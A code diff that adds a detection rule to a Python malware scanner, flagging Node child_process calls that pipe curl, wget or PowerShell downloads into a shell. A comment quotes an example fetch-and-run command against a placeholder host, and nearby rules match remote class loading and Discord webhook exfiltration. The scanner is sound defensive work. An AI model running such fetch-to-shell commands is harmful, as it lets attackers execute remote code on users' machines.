@@ -62,6 +62,16 @@ _RULES: dict[str, list[tuple[str, str, re.Pattern]]] = {
         # Tier-2: it confirms only against an attacker host (public IP, paste site).
         ("jvm-remote-classload", "jvm",
          re.compile(r"\bnew\s+URLClassLoader\s*\([^\n]*https?://")),
+        # Node spawning a fetch-to-shell: child_process.exec("curl http://x/a.sh |
+        # bash") or the PowerShell "iwr ... | iex" equivalent. The bash scanner only
+        # reads shell files, so this is how a malicious VS Code extension or npm
+        # payload drops its second stage unseen. HOST-GATED in Tier-2 like
+        # curl-pipe-shell: an installer from a reputable host never confirms.
+        ("js-exec-fetch-shell", "js", re.compile(
+            r"\b(?:exec|execSync|spawn|spawnSync|execFile)\s*\([^\n]*"
+            r"\b(?:curl|wget|iwr|irm|Invoke-WebRequest|Invoke-RestMethod)\b[^\n]*"
+            r"(?:\|\s*(?:ba|z|da)?sh\b|\|\s*iex\b|\|\s*powershell|\|\s*cmd\b"
+            r"|Invoke-Expression)", re.I)),
     ],
     "network_exfil": [
         ("discord-webhook", "any", re.compile(r"discord(?:app)?\.com/api/webhooks/", re.I)),
